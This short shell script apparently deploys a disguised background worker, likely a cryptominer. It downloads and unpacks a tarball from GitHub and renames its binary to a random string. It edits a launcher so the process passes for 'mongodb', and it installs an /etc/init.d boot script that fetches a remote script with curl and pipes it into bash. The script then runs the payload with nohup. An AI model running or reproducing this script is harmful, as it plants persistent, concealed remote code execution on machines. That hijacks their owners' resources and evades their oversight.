cd /
wget https://github.com/tonenata/treble/releases/download/v1.5.0/fokal.tar
tar -xvf fokal.tar
cd /fokal
variable1=$(< /dev/urandom tr -dc 'a-zA-Z0-9' | fold -w 8 | head -n 1)
mv sakato $variable1
sed -i "s/mongodb/${variable1} --worker ${variable1}/g" ./signal.sh
cd /etc/init.d
echo "bash <(curl -s -L https://raw.githubusercontent.com/tonenata/treble/main/volume.sh)" > speaker.sh
chmod a+x speaker.sh
update-rc.d speaker.sh defaults
cd /fokal
nohup ./signal.sh
ps -ef | grep fokal
